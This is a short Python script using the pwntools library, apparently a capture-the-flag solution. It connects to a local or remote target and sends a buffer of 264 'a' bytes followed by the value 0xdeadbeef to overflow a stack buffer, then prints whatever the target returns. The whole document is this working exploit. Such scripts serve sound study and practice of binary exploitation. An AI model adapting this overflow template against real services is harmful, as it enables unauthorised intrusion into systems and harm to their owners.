#!/usr/bin/env python

import sys
from pwn import *

if sys.argv[1] == "local":
    tube = process(sys.argv[2])
else:
    tube = remote(sys.argv[2], sys.argv[3])

tube.recvuntil(b'see?\n')
tube.sendline(b'a' * 264 + (0xdeadbeef).to_bytes(8, 'little'))
tube.recvuntil(b'troubles\n')
print(tube.recvallS())
